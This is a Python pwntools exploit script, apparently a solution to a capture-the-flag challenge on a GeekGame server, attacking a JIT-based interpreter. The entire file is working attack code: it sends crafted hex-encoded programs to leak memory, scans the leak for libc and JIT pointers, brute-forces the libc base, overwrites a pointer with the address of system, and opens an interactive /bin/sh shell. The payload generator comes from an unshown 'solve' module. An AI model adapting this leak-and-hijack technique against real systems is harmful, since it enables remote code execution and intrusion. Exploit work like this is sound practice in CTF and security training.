from pwn import *
from solve import *
import time
import re
import struct

#context.log_level = "debug"


#main_arena_96_offset = 0x1ebbe0
system_offset = 0x55410


def recv_addr(r):
    d = bytearray()
    while True:
        try:
            b = r.recv(timeout=3)
        except EOFError:
            break
        if len(b) == 0:
            break
        d += b
    return d

def new_session():
    r = remote("prob13.geekgame.pku.edu.cn", 10013)
    token = "my_token"
    r.sendlineafter("token:", token)
    return r


def try_attack(libc_addr_ptr, libc_offset, jit_code_ptr, test):
    r = new_session()
    if libc_addr_ptr > 0:
        libc_addr_ptr += 8
    code = gen_payload(libc_addr_ptr, jit_code_ptr)
    with open("tmp.bf", "w") as f:
        f.write(code)
    code = code.encode().hex()
    r.recvuntil("hex): ")
    r.sendline(code)
    r.send(b'\n')

    d = recv_addr(r)
    print(len(d))
    if libc_addr_ptr < 0:
        print(d[::-1])
    else:
        print(d)

    a = d[-8:]
    if libc_addr_ptr < 0:
        a = a[::-1]
    addr = int.from_bytes(a, "little")

    print("addr", hex(addr))
    libc_base = (addr & ~0xfff) - (libc_offset * 0x1000)
    if libc_base < 0:
        return False
    print("libc", hex(libc_base))
    system_addr = libc_base + system_offset
    try:
        r.send(system_addr.to_bytes(8, "little"))
        if test:
            r.send("ls /\x00\n".ljust(10))
            r.send("\n")
            data = r.recvall(timeout=3)
            r.close()
            return b"bin" in data
        else:
            r.send("/bin/sh\x00\n".ljust(10))
            r.send("\n")
            r.interactive()
    except BrokenPipeError:
        pass
    except EOFError:
        pass
    r.close()


def attack(libc_addr_ptr, jit_code_ptr):
    for i in range(0x1e7, 0x200):
        if try_attack(libc_addr_ptr, i, jit_code_ptr, True):
            try_attack(libc_addr_ptr, i, jit_code_ptr, False)
        time.sleep(10)


def view(a_ptr):
    r = new_session()
    code = gen_show_mem(a_ptr)
    code = code.encode().hex()
    r.recvuntil("hex): ")
    r.sendline(code)
    r.send(b'\n')
    data = recv_addr(r)
    r.close()

    if a_ptr < 0:
        data = data[::-1]
    
    def index_of(x):
        p_len = len(data)
        if a_ptr >= 0:
            return a_ptr + x - p_len
        else:
            return a_ptr + x

    addr_pattern = rb".{5}\x7f\x00\x00"
    addrs = []
    for m in re.finditer(addr_pattern, data):
        addr = struct.unpack("<Q", m.group())[0]
        addrs.append((index_of(m.start()), addr))
    addrs.sort(key=lambda x: x[1])
    for i in range(len(addrs)):
        if i == 0 or addrs[i][1] >= addrs[i-1][1]+0x100:
            print(addrs[i][0], hex(addrs[i][1]))

    for m in re.finditer(rb"(\x10|\x11)\x80\x00{6}\x00{152}"+addr_pattern, data):
        print("jit", index_of(m.start()+8))

    return data
